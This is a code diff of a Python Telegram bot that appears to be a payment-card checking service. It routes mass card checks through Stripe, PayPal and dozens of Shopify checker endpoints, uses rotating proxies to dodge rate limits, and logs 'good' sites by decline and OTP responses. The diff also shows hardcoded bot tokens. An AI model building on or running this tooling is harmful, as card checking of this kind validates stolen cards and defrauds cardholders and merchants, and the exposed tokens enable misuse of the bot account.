@@ -72,6 +72,8 @@ MAX_CONCURRENT_USERS = 2000
 # REMOVED the global semaphore that was blocking all users
 # user_semaphore = Semaphore(MAX_CONCURRENT_USERS)
 
+
+
 # ============ SESSION RECOVERY SYSTEM ============
 SESSION_STATE_FILE = "session_state.json"
 PENDING_BATCHES_FILE = "pending_batches.json"
@@ -164,6 +166,8 @@ class SessionRecovery:
                 print(f"⚠️ Error clearing pending batches: {e}")
 
 session_recovery = SessionRecovery()
+
+GLOBAL_PROXY_ONLY_MODE = True
 
 # ============ AUTO-RETRY MANAGER ============
 class AutoRetryManager:
@@ -2838,134 +2842,10 @@ def mask_proxy(proxy_str):
         pass
     return "Proxy (masked)"
 
-def get_proxy_for_user(user_id: int) -> Optional[str]:
-    """Get a proxy for a specific user (return raw, unformatted)"""
-    return proxy_manager.get_next_proxy_for_user(user_id)
 
-def get_rotating_proxy_for_user(user_id: int, gateway: str = 'paypal') -> Optional[str]:
-    """Get next proxy in rotation for a specific user"""
-    if not user_manager.can_use_proxy(user_id):
-        return None
-    
-    # Check if user has any proxies
-    if user_id not in proxy_manager.user_proxies or not proxy_manager.user_proxies[user_id]:
-        return None
-    
-    # Get ALL available proxies (failed ones are already removed)
-    available_proxies = proxy_manager.user_proxies[user_id].copy()
-    
-    if not available_proxies:
-        return None
-    
-    # Create rotation index
-    rotation_key = f"{user_id}_{gateway}"
-    if not hasattr(proxy_manager, 'user_rotation_indices'):
-        proxy_manager.user_rotation_indices = {}
-    
-    if rotation_key not in proxy_manager.user_rotation_indices:
-        proxy_manager.user_rotation_indices[rotation_key] = 0
-    
-    # Get next proxy
-    idx = proxy_manager.user_rotation_indices[rotation_key] % len(available_proxies)
-    selected_raw = available_proxies[idx]
-    
-    # Update index
-    proxy_manager.user_rotation_indices[rotation_key] = (idx + 1) % len(available_proxies)
-    
-    # Format the proxy
-    formatted = format_proxy_for_paypal(selected_raw)
-    
-    print(f"🔄 [PAYPAL] Using proxy #{idx + 1}/{len(available_proxies)}: {mask_proxy(formatted or selected_raw)}")
-    
-    return formatted or selected_raw
 
 # Update the get_proxy_for_user function to support rotation
-def get_proxy_for_user(user_id: int, gateway: str = 'default') -> Optional[str]:
-    """
-    Get a proxy for a specific user with rotation support for different gateways
-    """
-    if gateway == 'paypal':
-        return get_rotating_proxy_for_user(user_id, 'paypal')
-    
-    # Default behavior for other gateways
-    return proxy_manager.get_next_proxy_for_user(user_id)
 
-def get_working_proxy_for_user(user_id: int, api_type: str = 'any') -> Optional[str]:
-    """
-    Get best working proxy from user's pool based on performance
-    """
-    if not user_manager.can_use_proxy(user_id):
-        return None
-    
-    # Check if user has any proxies
-    if user_id not in proxy_manager.user_proxies or not proxy_manager.user_proxies[user_id]:
-        return None
-    
-    # Get available proxies (not marked as failed in current session)
-    available_proxies = []
-    failed_set = proxy_manager.user_failed_proxies.get(user_id, set())
-    
-    for proxy in proxy_manager.user_proxies[user_id]:
-        if proxy not in failed_set:
-            available_proxies.append(proxy)
-    
-    # If all proxies are failed, reset and try all
-    if not available_proxies:
-        print(f"🔄 All proxies failed for user {user_id}, resetting failed list")
-        proxy_manager.user_failed_proxies[user_id] = set()
-        available_proxies = proxy_manager.user_proxies[user_id].copy()
-    
-    if not available_proxies:
-        return None
-    
-    # Prioritize proxies that work with the specific API
-    prioritized_proxies = []
-    
-    if api_type == 'main':
-        # Get proxies that work with MAIN API
-        main_api_proxies = proxy_manager.user_main_api_proxies.get(user_id, [])
-        for proxy in main_api_proxies:
-            if proxy in available_proxies:
-                prioritized_proxies.append(proxy)
-    elif api_type == 'backup':
-        # Get proxies that work with BACKUP API
-        backup_api_proxies = getattr(proxy_manager, 'user_backup_api_proxies', {}).get(user_id, [])
-        for proxy in backup_api_proxies:
-            if proxy in available_proxies:
-                prioritized_proxies.append(proxy)
-    
-    # If we have prioritized proxies, use them
-    if prioritized_proxies:
-        # Use round-robin on prioritized proxies
-        if user_id not in proxy_manager.user_proxy_index:
-            proxy_manager.user_proxy_index[user_id] = 0
-        idx = proxy_manager.user_proxy_index[user_id] % len(prioritized_proxies)
-        proxy_manager.user_proxy_index[user_id] = (idx + 1) % len(prioritized_proxies)
-        selected = prioritized_proxies[idx]
-        
-        # Format based on API type
-        if api_type == 'main':
-            return convert_to_main_api_format(selected)
-        elif api_type == 'backup':
-            return format_proxy_for_api('backup', selected)
-        else:
-            return convert_to_main_api_format(selected)
-    
-    # Fallback to all proxies
-    if user_id not in proxy_manager.user_proxy_index:
-        proxy_manager.user_proxy_index[user_id] = 0
-    
-    idx = proxy_manager.user_proxy_index[user_id] % len(available_proxies)
-    proxy_manager.user_proxy_index[user_id] = (idx + 1) % len(available_proxies)
-    selected = available_proxies[idx]
-    
-    # Format based on API type
-    if api_type == 'main':
-        return convert_to_main_api_format(selected)
-    elif api_type == 'backup':
-        return format_proxy_for_api('backup', selected)
-    else:
-        return convert_to_main_api_format(selected)
 
 # ============ SMART PROXY FORMATTER FOR MULTIPLE APIS ============
 
@@ -10243,7 +10123,7 @@ async def stripe_auth_single_check_logic(update: Update, context: ContextTypes.D
         print(f"❌ [Stripe Auth Single] Error: {traceback.format_exc()}")
 
 # --- CONFIG ---
-BOT_TOKEN = '8695085393:AAE5eUUQCpp7DPbVJ4HAS52KxEUX8BrQ6Bk'
+BOT_TOKEN = '8695085393:AAEY-1yHHNBnW5rJRs-t9inMgWfhKJ7cRNU'
 OWNER_ID = 6299808404
 PAYPAL_API_BASE = "https://web-production-9c43d.up.railway.app"
 
@@ -10832,7 +10712,80 @@ async def check_and_deduct_mass_credits(user_id: int, update: Update, context: C
 # ============ GATEWAY STATUS STORAGE ============
 GATEWAY_STATUS_FILE = "gateway_status.json"
 
-# ============ FIXED GATEWAY MANAGER ============
+
+# ============ PROXY CHECKER FOR MASS CHECKS ============
+
+async def check_user_has_proxies(user_id: int, update: Update, context: ContextTypes.DEFAULT_TYPE) -> Tuple[bool, str]:
+    """
+    Check if user has ANY proxies available (personal or global)
+    Returns: (has_proxies, message)
+    """
+    # Admin/Owner bypass
+    if user_id == OWNER_ID:
+        return True, None
+    
+    # Check 1: User's personal proxies
+    user_proxies = proxy_manager.user_proxies.get(user_id, [])
+    if user_proxies:
+        # Check if any are working (not marked as failed)
+        failed_set = proxy_manager.user_failed_proxies.get(user_id, set())
+        working_proxies = [p for p in user_proxies if p not in failed_set]
+        if working_proxies:
+            return True, f"✅ Found {len(working_proxies)} working personal proxies"
+        elif user_proxies:
+            return False, f"❌ You have {len(user_proxies)} proxies but ALL are dead. Run /pt to test and remove dead proxies."
+    
+    # Check 2: Global proxy pool
+    if global_proxy_pool.enabled and global_proxy_pool.proxies:
+        # Check if global proxies are working
+        working_global = []
+        for p in global_proxy_pool.proxies[:10]:  # Check first 10
+            stats = global_proxy_pool.proxy_stats.get(p, {})
+            if stats.get('successes', 0) > 0 or stats.get('total_checks', 0) == 0:
+                working_global.append(p)
+        
+        if working_global:
+            return True, f"🌐 Found {len(working_global)} available global proxies"
+        else:
+            return False, "🌐 Global proxies exist but all are dead. Contact @lencax"
+    
+    # No proxies available
+    return False, None
+
+
+def get_proxy_warning_message(user_id: int) -> str:
+    """
+    Generate a detailed warning message for users without proxies
+    """
+    user_proxies = proxy_manager.user_proxies.get(user_id, [])
+    failed_set = proxy_manager.user_failed_proxies.get(user_id, set())
+    working = [p for p in user_proxies if p not in failed_set]
+    
+    msg = (
+        "You need to add proxies before using \n\n"
+        "<b>Supported Formats:</b>\n"
+        "• <code>user:pass@ip:port</code>\n"
+        "• <code>user:pass:ip:port</code>\n"
+        "• <code>ip:port</code>\n"
+        "• <code>host:port:user:pass</code>\n\n"
+        f"1. Add proxies: <code>/massproxy proxy1 proxy2 proxy3 ...</code>\n"
+        f"2. Test proxies: <code>/pt</code>\n"
+        f"3. Start mass check\n\n"
+    )
+    
+    if user_proxies:
+        msg += f"📊 <b>Your Proxy Status:</b>\n"
+        msg += f"   • Total: {len(user_proxies)}\n"
+        msg += f"   • Working: {len(working)}\n"
+        msg += f"   • Dead: {len(failed_set)}\n\n"
+        msg += f"💡 Run <code>/pt</code> to test your proxies.\n"
+    else:
+        msg += f"📊 <b>Your Proxy Status:</b> No proxies added yet.\n\n"
+        msg += f"💡 Add your first proxy: <code>/addmyproxy user:pass@ip:port</code>\n"
+    
+    msg += f"\n💀 <b>Bot</b> ➛ @BLADESARKS_V3bot"
+    
+    return msg
 
 # ============ FIXED GATEWAY MANAGER - COMPLETE ============
 # Replace your entire GatewayManager class with this
@@ -11389,8 +11342,8 @@ def check_gateway(gateway_name: str):
 SHOPIFY_API_POOL = [
     
     {
-        "name": " a1",
-        "url": "https://a1-production-e26e.up.railway.app/shopify",
+        "name": " s1",
+        "url": "https://s1-production-1118.up.railway.app/shopify",
         "type": "get",
         "params_format": "query",
         "timeout": 45,
@@ -11403,8 +11356,8 @@ SHOPIFY_API_POOL = [
         "year_format": "2digit"
     },
     {
-        "name": " a2",
-        "url": "https://a2-production-be71.up.railway.app/shopify",
+        "name": " s2",
+        "url": "https://s2-production-cf59.up.railway.app/shopify",
         "type": "get",
         "params_format": "query",
         "timeout": 45,
@@ -11417,8 +11370,8 @@ SHOPIFY_API_POOL = [
         "year_format": "2digit"
     },
     {
-        "name": " a3",
-        "url": "https://a3-production-3281.up.railway.app/shopify",
+        "name": " s3",
+        "url": "https://s3-production-9391.up.railway.app/shopify",
         "type": "get",
         "params_format": "query",
         "timeout": 45,
@@ -11431,8 +11384,8 @@ SHOPIFY_API_POOL = [
         "year_format": "2digit"
     },
     {
-        "name": " a4",
-        "url": "https://a4-production-a5af.up.railway.app/shopify",
+        "name": " s4",
+        "url": "https://s4-production-fd80.up.railway.app/shopify",
         "type": "get",
         "params_format": "query",
         "timeout": 45,
@@ -11445,724 +11398,25 @@ SHOPIFY_API_POOL = [
         "year_format": "2digit"
     },
     {
-        "name": " a5",
-        "url": "https://a5-production.up.railway.app/shopify",
-        "type": "get",
-        "params_format": "query",
-        "timeout": 45,
-        "weight": 15,
-        "enabled": True,
-        "success_count": 0,
-        "fail_count": 0,
-        "last_success": 0,
-        "avg_response_time": 0,
-        "year_format": "2digit"
-    },
-    {
-        "name": " a6",
-        "url": "https://a6-production.up.railway.app/shopify",
-        "type": "get",
-        "params_format": "query",
-        "timeout": 45,
-        "weight": 15,
-        "enabled": True,
-        "success_count": 0,
-        "fail_count": 0,
-        "last_success": 0,
-        "avg_response_time": 0,
-        "year_format": "2digit"
-    },
-    {
-        "name": " a7",
-        "url": "https://a7-production.up.railway.app/shopify",
-        "type": "get",
-        "params_format": "query",
-        "timeout": 45,
-        "weight": 15,
-        "enabled": True,
-        "success_count": 0,
-        "fail_count": 0,
-        "last_success": 0,
-        "avg_response_time": 0,
-        "year_format": "2digit"
-    },
-    {
-        "name": " a8",
-        "url": "https://a8-production-bef2.up.railway.app/shopify",
-        "type": "get",
-        "params_format": "query",
-        "timeout": 45,
-        "weight": 15,
-        "enabled": True,
-        "success_count": 0,
-        "fail_count": 0,
-        "last_success": 0,
-        "avg_response_time": 0,
-        "year_format": "2digit"
-    },
-    {
-        "name": " a9",
-        "url": "https://a9-production.up.railway.app/shopify",
-        "type": "get",
-        "params_format": "query",
-        "timeout": 45,
-        "weight": 15,
-        "enabled": True,
-        "success_count": 0,
-        "fail_count": 0,
-        "last_success": 0,
-        "avg_response_time": 0,
-        "year_format": "2digit"
-    },
-    {
-        "name": " a10",
-        "url": "https://a10-production.up.railway.app/shopify",
-        "type": "get",
-        "params_format": "query",
-        "timeout": 45,
-        "weight": 15,
-        "enabled": True,
-        "success_count": 0,
-        "fail_count": 0,
-        "last_success": 0,
-        "avg_response_time": 0,
-        "year_format": "2digit"
-    },
-    {
-        "name": " a11",
-        "url": "https://a11-production-fff3.up.railway.app/shopify",
-        "type": "get",
-        "params_format": "query",
-        "timeout": 45,
-        "weight": 15,
-        "enabled": True,
-        "success_count": 0,
-        "fail_count": 0,
-        "last_success": 0,
-        "avg_response_time": 0,
-        "year_format": "2digit"
-    },
-    {
-        "name": " a12",
-        "url": "https://a12-production.up.railway.app/shopify",
-        "type": "get",
-        "params_format": "query",
-        "timeout": 45,
-        "weight": 15,
-        "enabled": True,
-        "success_count": 0,
-        "fail_count": 0,
-        "last_success": 0,
-        "avg_response_time": 0,
-        "year_format": "2digit"
-    },
-    {
-        "name": " a13",
-        "url": "https://a13-production.up.railway.app/shopify",
-        "type": "get",
-        "params_format": "query",
-        "timeout": 45,
-        "weight": 15,
-        "enabled": True,
-        "success_count": 0,
-        "fail_count": 0,
-        "last_success": 0,
-        "avg_response_time": 0,
-        "year_format": "2digit"
-    },
-    {
-        "name": "a14",
-        "url": "https://a14-production.up.railway.app/shopify",
-        "type": "get",
-        "params_format": "query",
-        "timeout": 45,
-        "weight": 15,
-        "enabled": True,
-        "success_count": 0,
-        "fail_count": 0,
-        "last_success": 0,
-        "avg_response_time": 0,
-        "year_format": "2digit"
-    },
-    {
-        "name": "a15",
-        "url": "https://a15-production.up.railway.app/shopify",
-        "type": "get",
-        "params_format": "query",
-        "timeout": 45,
-        "weight": 15,
-        "enabled": True,
-        "success_count": 0,
-        "fail_count": 0,
-        "last_success": 0,
-        "avg_response_time": 0,
-        "year_format": "2digit"
-    },
-    {
-        "name": "a16",
-        "url": "https://a16-production.up.railway.app/shopify",
-        "type": "get",
-        "params_format": "query",
-        "timeout": 45,
-        "weight": 15,
-        "enabled": True,
-        "success_count": 0,
-        "fail_count": 0,
-        "last_success": 0,
-        "avg_response_time": 0,
-        "year_format": "2digit"
-    },
-    {
-        "name": "a17",
-        "url": "https://a17-production-97f8.up.railway.app/shopify",
-        "type": "get",
-        "params_format": "query",
-        "timeout": 45,
-        "weight": 15,
-        "enabled": True,
-        "success_count": 0,
-        "fail_count": 0,
-        "last_success": 0,
-        "avg_response_time": 0,
-        "year_format": "2digit"
-    },
-    {
-        "name": "a18",
-        "url": "https://a18-production.up.railway.app/shopify",
-        "type": "get",
-        "params_format": "query",
-        "timeout": 45,
-        "weight": 15,
-        "enabled": True,
-        "success_count": 0,
-        "fail_count": 0,
-        "last_success": 0,
-        "avg_response_time": 0,
-        "year_format": "2digit"
-    },
-    {
-        "name": "a19",
-        "url": "https://a19-production.up.railway.app/shopify",
-        "type": "get",
-        "params_format": "query",
-        "timeout": 45,
-        "weight": 15,
-        "enabled": True,
-        "success_count": 0,
-        "fail_count": 0,
-        "last_success": 0,
-        "avg_response_time": 0,
-        "year_format": "2digit"
-    },
-    {
-        "name": "a20",
-        "url": "https://a20-production.up.railway.app/shopify",
-        "type": "get",
-        "params_format": "query",
-        "timeout": 45,
-        "weight": 15,
-        "enabled": True,
-        "success_count": 0,
-        "fail_count": 0,
-        "last_success": 0,
-        "avg_response_time": 0,
-        "year_format": "2digit"
-    },
-    {
-        "name": "a21",
-        "url": "https://a21-production.up.railway.app/shopify",
-        "type": "get",
-        "params_format": "query",
-        "timeout": 45,
-        "weight": 15,
-        "enabled": True,
-        "success_count": 0,
-        "fail_count": 0,
-        "last_success": 0,
-        "avg_response_time": 0,
-        "year_format": "2digit"
-    },
-    {
-        "name": "a22",
-        "url": "https://a22-production.up.railway.app/shopify",
-        "type": "get",
-        "params_format": "query",
-        "timeout": 45,
-        "weight": 15,
-        "enabled": True,
-        "success_count": 0,
-        "fail_count": 0,
-        "last_success": 0,
-        "avg_response_time": 0,
-        "year_format": "2digit"
-    },
-    {
-        "name": "a23",
-        "url": "https://a23-production.up.railway.app/shopify",
-        "type": "get",
-        "params_format": "query",
-        "timeout": 45,
-        "weight": 15,
-        "enabled": True,
-        "success_count": 0,
-        "fail_count": 0,
-        "last_success": 0,
-        "avg_response_time": 0,
-        "year_format": "2digit"
-    },
-    {
-        "name": "a24",
-        "url": "https://a24-production.up.railway.app/shopify",
-        "type": "get",
-        "params_format": "query",
-        "timeout": 45,
-        "weight": 15,
-        "enabled": True,
-        "success_count": 0,
-        "fail_count": 0,
-        "last_success": 0,
-        "avg_response_time": 0,
-        "year_format": "2digit"
-    },
-    {
-        "name": "a25",
-        "url": "https://a25-production-b1d4.up.railway.app/shopify",
-        "type": "get",
-        "params_format": "query",
-        "timeout": 45,
-        "weight": 15,
-        "enabled": True,
-        "success_count": 0,
-        "fail_count": 0,
-        "last_success": 0,
-        "avg_response_time": 0,
-        "year_format": "2digit"
-    },
-    {
-        "name": "a26",
-        "url": "https://a26-production.up.railway.app/shopify",
-        "type": "get",
-        "params_format": "query",
-        "timeout": 45,
-        "weight": 15,
-        "enabled": True,
-        "success_count": 0,
-        "fail_count": 0,
-        "last_success": 0,
-        "avg_response_time": 0,
-        "year_format": "2digit"
-    },
-    {
-        "name": "a27",
-        "url": "https://a27-production.up.railway.app/shopify",
-        "type": "get",
-        "params_format": "query",
-        "timeout": 45,
-        "weight": 15,
-        "enabled": True,
-        "success_count": 0,
-        "fail_count": 0,
-        "last_success": 0,
-        "avg_response_time": 0,
-        "year_format": "2digit"
-    },
-    {
-        "name": "a28",
-        "url": "https://a28-production.up.railway.app/shopify",
-        "type": "get",
-        "params_format": "query",
-        "timeout": 45,
-        "weight": 15,
-        "enabled": True,
-        "success_count": 0,
-        "fail_count": 0,
-        "last_success": 0,
-        "avg_response_time": 0,
-        "year_format": "2digit"
-    },
-    {
-        "name": "a29",
-        "url": "https://a29-production.up.railway.app/shopify",
-        "type": "get",
-        "params_format": "query",
-        "timeout": 45,
-        "weight": 15,
-        "enabled": True,
-        "success_count": 0,
-        "fail_count": 0,
-        "last_success": 0,
-        "avg_response_time": 0,
-        "year_format": "2digit"
-    },
-    {
-        "name": "a30",
-        "url": "https://a29-production.up.railway.app/shopify",
-        "type": "get",
-        "params_format": "query",
-        "timeout": 45,
-        "weight": 15,
-        "enabled": True,
-        "success_count": 0,
-        "fail_count": 0,
-        "last_success": 0,
-        "avg_response_time": 0,
-        "year_format": "2digit"
-    },
-    {
-        "name": "b1",
-        "url": "https://b1-production-29f3.up.railway.app/shopify",
-        "type": "get",
-        "params_format": "query",
-        "timeout": 45,
-        "weight": 15,
-        "enabled": True,
-        "success_count": 0,
-        "fail_count": 0,
-        "last_success": 0,
-        "avg_response_time": 0,
-        "year_format": "2digit"
-    },
-    {
-        "name": "b2",
-        "url": "https://b2-production-b588.up.railway.app/shopify",
-        "type": "get",
-        "params_format": "query",
-        "timeout": 45,
-        "weight": 15,
-        "enabled": True,
-        "success_count": 0,
-        "fail_count": 0,
-        "last_success": 0,
-        "avg_response_time": 0,
-        "year_format": "2digit"
-    },
-    {
-        "name": "b3",
-        "url": "https://b3-production-2b68.up.railway.app/shopify",
-        "type": "get",
-        "params_format": "query",
-        "timeout": 45,
-        "weight": 15,
-        "enabled": True,
-        "success_count": 0,
-        "fail_count": 0,
-        "last_success": 0,
-        "avg_response_time": 0,
-        "year_format": "2digit"
-    },
-    {
-        "name": "b4",
-        "url": "https://b4-production.up.railway.app/shopify",
-        "type": "get",
-        "params_format": "query",
-        "timeout": 45,
-        "weight": 15,
-        "enabled": True,
-        "success_count": 0,
-        "fail_count": 0,
-        "last_success": 0,
-        "avg_response_time": 0,
-        "year_format": "2digit"
-    },
-    {
-        "name": "b5",
-        "url": "https://b5-production.up.railway.app/shopify",
-        "type": "get",
-        "params_format": "query",
-        "timeout": 45,
-        "weight": 15,
-        "enabled": True,
-        "success_count": 0,
-        "fail_count": 0,
-        "last_success": 0,
-        "avg_response_time": 0,
-        "year_format": "2digit"
-    },
-    {
-        "name": "b6",
-        "url": "https://b6-production-ea54.up.railway.app/shopify",
-        "type": "get",
-        "params_format": "query",
-        "timeout": 45,
-        "weight": 15,
-        "enabled": True,
-        "success_count": 0,
-        "fail_count": 0,
-        "last_success": 0,
-        "avg_response_time": 0,
-        "year_format": "2digit"
-    },
-    {
-        "name": "b7",
-        "url": "https://b7-production.up.railway.app/shopify",
-        "type": "get",
-        "params_format": "query",
-        "timeout": 45,
-        "weight": 15,
-        "enabled": True,
-        "success_count": 0,
-        "fail_count": 0,
-        "last_success": 0,
-        "avg_response_time": 0,
-        "year_format": "2digit"
-    },
-    {
-        "name": "b8",
-        "url": "https://b8-production.up.railway.app/shopify",
-        "type": "get",
-        "params_format": "query",
-        "timeout": 45,
-        "weight": 15,
-        "enabled": True,
-        "success_count": 0,
-        "fail_count": 0,
-        "last_success": 0,
-        "avg_response_time": 0,
-        "year_format": "2digit"
-    },
-    {
-        "name": "b9",
-        "url": "https://b9-production-a223.up.railway.app/shopify",
-        "type": "get",
-        "params_format": "query",
-        "timeout": 45,
-        "weight": 15,
-        "enabled": True,
-        "success_count": 0,
-        "fail_count": 0,
-        "last_success": 0,
-        "avg_response_time": 0,
-        "year_format": "2digit"
-    },
-    {
-        "name": "b10",
-        "url": "https://b10-production.up.railway.app/shopify",
-        "type": "get",
-        "params_format": "query",
-        "timeout": 45,
-        "weight": 15,
-        "enabled": True,
-        "success_count": 0,
-        "fail_count": 0,
-        "last_success": 0,
-        "avg_response_time": 0,
-        "year_format": "2digit"
-    },
-    {
-        "name": "b11",
-        "url": "https://b11-production.up.railway.app/shopify",
-        "type": "get",
-        "params_format": "query",
-        "timeout": 45,
-        "weight": 15,
-        "enabled": True,
-        "success_count": 0,
-        "fail_count": 0,
-        "last_success": 0,
-        "avg_response_time": 0,
-        "year_format": "2digit"
-    },
-    {
-        "name": "b12",
-        "url": "https://b12-production.up.railway.app/shopify",
-        "type": "get",
-        "params_format": "query",
-        "timeout": 45,
-        "weight": 15,
-        "enabled": True,
-        "success_count": 0,
-        "fail_count": 0,
-        "last_success": 0,
-        "avg_response_time": 0,
-        "year_format": "2digit"
-    },
-    {
-        "name": "b13",
-        "url": "https://b13-production.up.railway.app/shopify",
-        "type": "get",
-        "params_format": "query",
-        "timeout": 45,
-        "weight": 15,
-        "enabled": True,
-        "success_count": 0,
-        "fail_count": 0,
-        "last_success": 0,
-        "avg_response_time": 0,
-        "year_format": "2digit"
-    },
-    {
-        "name": "b14",
-        "url": "https://b14-production.up.railway.app/shopify",
-        "type": "get",
-        "params_format": "query",
-        "timeout": 45,
-        "weight": 15,
-        "enabled": True,
-        "success_count": 0,
-        "fail_count": 0,
-        "last_success": 0,
-        "avg_response_time": 0,
-        "year_format": "2digit"
-    },
-    {
-        "name": "b15",
-        "url": "https://b15-production.up.railway.app/shopify",
-        "type": "get",
-        "params_format": "query",
-        "timeout": 45,
-        "weight": 15,
-        "enabled": True,
-        "success_count": 0,
-        "fail_count": 0,
-        "last_success": 0,
-        "avg_response_time": 0,
-        "year_format": "2digit"
-    },
-    {
-        "name": "b16",
-        "url": "https://b16-production.up.railway.app/shopify",
-        "type": "get",
-        "params_format": "query",
-        "timeout": 45,
-        "weight": 15,
-        "enabled": True,
-        "success_count": 0,
-        "fail_count": 0,
-        "last_success": 0,
-        "avg_response_time": 0,
-        "year_format": "2digit"
-    },
-    {
-        "name": "b17",
-        "url": "https://b17-production.up.railway.app/shopify",
-        "type": "get",
-        "params_format": "query",
-        "timeout": 45,
-        "weight": 15,
-        "enabled": True,
-        "success_count": 0,
-        "fail_count": 0,
-        "last_success": 0,
-        "avg_response_time": 0,
-        "year_format": "2digit"
-    },
-    {
-        "name": "b18",
-        "url": "https://b18-production.up.railway.app/shopify",
-        "type": "get",
-        "params_format": "query",
-        "timeout": 45,
-        "weight": 15,
-        "enabled": True,
-        "success_count": 0,
-        "fail_count": 0,
-        "last_success": 0,
-        "avg_response_time": 0,
-        "year_format": "2digit"
-    },
-    {
-        "name": "b19",
-        "url": "https://b19-production.up.railway.app/shopify",
-        "type": "get",
-        "params_format": "query",
-        "timeout": 45,
-        "weight": 15,
-        "enabled": True,
-        "success_count": 0,
-        "fail_count": 0,
-        "last_success": 0,
-        "avg_response_time": 0,
-        "year_format": "2digit"
-    },
-    {
-        "name": "b20",
-        "url": "https://b20-production-b65a.up.railway.app/shopify",
-        "type": "get",
-        "params_format": "query",
-        "timeout": 45,
-        "weight": 15,
-        "enabled": True,
-        "success_count": 0,
-        "fail_count": 0,
-        "last_success": 0,
-        "avg_response_time": 0,
-        "year_format": "2digit"
-    },
-    {
-        "name": "b21",
-        "url": "https://b21-production.up.railway.app/shopify",
-        "type": "get",
-        "params_format": "query",
-        "timeout": 45,
-        "weight": 15,
-        "enabled": True,
-        "success_count": 0,
-        "fail_count": 0,
-        "last_success": 0,
-        "avg_response_time": 0,
-        "year_format": "2digit"
-    },
-    {
-        "name": "b22",
-        "url": "https://b22-production.up.railway.app/shopify",
-        "type": "get",
-        "params_format": "query",
-        "timeout": 45,
-        "weight": 15,
-        "enabled": True,
-        "success_count": 0,
-        "fail_count": 0,
-        "last_success": 0,
-        "avg_response_time": 0,
-        "year_format": "2digit"
-    },
-    {
-        "name": "b23",
-        "url": "https://b23-production.up.railway.app/shopify",
-        "type": "get",
-        "params_format": "query",
-        "timeout": 45,
-        "weight": 15,
-        "enabled": True,
-        "success_count": 0,
-        "fail_count": 0,
-        "last_success": 0,
-        "avg_response_time": 0,
-        "year_format": "2digit"
-    },
-    {
-        "name": "b24",
-        "url": "https://b24-production-f4d3.up.railway.app/shopify",
-        "type": "get",
-        "params_format": "query",
-        "timeout": 45,
-        "weight": 15,
-        "enabled": True,
-        "success_count": 0,
-        "fail_count": 0,
-        "last_success": 0,
-        "avg_response_time": 0,
-        "year_format": "2digit"
-    },
-    {
-        "name": "b25",
-        "url": "https://b25-production-be11.up.railway.app/shopify",
-        "type": "get",
-        "params_format": "query",
-        "timeout": 45,
-        "weight": 15,
-        "enabled": True,
-        "success_count": 0,
-        "fail_count": 0,
-        "last_success": 0,
-        "avg_response_time": 0,
-        "year_format": "2digit"
-    },
+            "name": " s5",
+            "url": "https://s5-production.up.railway.app/shopify",
+            "type": "get",
+            "params_format": "query",
+            "timeout": 45,
+            "weight": 15,
+            "enabled": True,
+            "success_count": 0,
+            "fail_count": 0,
+            "last_success": 0,
+            "avg_response_time": 0,
+            "year_format": "2digit"
+        },
+    
+    
+    
 ]
 
 
-
-# ============ SHOPIFY API POOL MANAGER ============
 
 # ============ SHOPIFY API POOL MANAGER - FIXED WITH PROXY ROTATION ============
 
@@ -12170,9 +11424,11 @@ class ShopifyAPIPool:
     """
     Rotates between multiple Shopify APIs to distribute load
     Supports weighted round-robin and automatic failover
-    MAX 8 TOTAL ATTEMPTS per card (not per API)
-    GOOD sites (CARD_DECLINED/OTP_REQUIRED) are NEVER removed
+    RETRY UNTIL ALL SITES ARE EXHAUSTED (no hard limit)
     PROXY ROTATION on retry to avoid rate limiting
+    GOOD sites (CARD_DECLINED/OTP_REQUIRED) are prioritized for next cards
+    429 errors are tracked - sites with 20+ 429 errors are removed
+    APIs are NEVER disabled - all APIs remain active
     """
     
     def __init__(self, apis=None):
@@ -12187,22 +11443,164 @@ class ShopifyAPIPool:
         # Track cards that have already been retried
         self.retried_cards = set()
         
-        # Initialize stats for each API
+        # ============ SITE PERFORMANCE TRACKING ============
+        self.site_performance = {}  # site -> {good_responses, rate_limits, total_checks, last_response, last_time}
+        self.good_sites_cache = []  # Cached list of good sites (sorted by performance)
+        self.good_sites_cache_time = 0
+        self.good_sites_cache_ttl = 60  # Refresh cache every 60 seconds
+        
+        # Load saved site performance data
+        self._load_site_performance()
+        
+        # Initialize stats for each API - ALL APIs remain enabled
         for api in self.apis:
+            api["enabled"] = True  # Force enable all APIs
             self.api_stats[api["name"]] = {
                 "total_requests": 0,
                 "successful": 0,
                 "failed": 0,
                 "retryable": 0,
+                "rate_limited": 0,
                 "avg_response_time": 0,
                 "last_used": 0,
-                "enabled": api.get("enabled", True),
+                "enabled": True,  # Always enabled
                 "weight": api.get("weight", 1)
             }
         
-        print(f"🔌 Shopify API Pool initialized with {len(self.apis)} APIs")
+        print(f"🔌 Shopify API Pool initialized with {len(self.apis)} APIs (ALL ENABLED - NEVER DISABLE)")
         for api in self.apis:
             print(f"   • {api['name']}: {api['url']} (weight: {api.get('weight', 1)})")
+        print(f"📊 Loaded performance data for {len(self.site_performance)} sites")
+    
+    def _load_site_performance(self):
+        """Load site performance data from file"""
+        try:
+            if Path('site_performance.json').exists():
+                with open('site_performance.json', 'r') as f:
+                    data = json.load(f)
+                    self.site_performance = data.get('sites', {})
+                    print(f"📊 Loaded site performance for {len(self.site_performance)} sites")
+            else:
+                self.site_performance = {}
+        except Exception as e:
+            print(f"⚠️ Error loading site performance: {e}")
+            self.site_performance = {}
+    
+    def _save_site_performance(self):
+        """Save site performance data to file"""
+        try:
+            data = {
+                'sites': self.site_performance,
+                'timestamp': time.time()
+            }
+            with open('site_performance.json', 'w') as f:
+                json.dump(data, f, indent=2)
+        except Exception as e:
+            print(f"⚠️ Error saving site performance: {e}")
+    
+    def _update_site_performance(self, site: str, response_text: str, is_good: bool = False, is_rate_limit: bool = False):
+        """Update site performance tracking"""
+        if site not in self.site_performance:
+            self.site_performance[site] = {
+                'good_responses': 0,
+                'rate_limits': 0,
+                'total_checks': 0,
+                'last_response': '',
+                'last_time': 0,
+                'is_good': False
+            }
+        
+        stats = self.site_performance[site]
+        stats['total_checks'] += 1
+        stats['last_response'] = response_text[:100]
+        stats['last_time'] = time.time()
+        
+        if is_good:
+            stats['good_responses'] += 1
+            stats['is_good'] = True
+            # Invalidate cache
+            self.good_sites_cache_time = 0
+            print(f"🌟 [SITE TRACKING] Good response for {site} (total good: {stats['good_responses']})")
+        
+        if is_rate_limit:
+            stats['rate_limits'] += 1
+            print(f"🚫 [SITE TRACKING] Rate limit #{stats['rate_limits']} for {site}")
+            
+            # ============ REMOVE SITE AFTER 20 RATE LIMITS ============
+            if stats['rate_limits'] >= 20:
+                print(f"🗑️ [SITE REMOVAL] Site {site} removed due to 20+ rate limits (429 errors)")
+                autosopi_site_manager.remove_site(site, OWNER_ID)
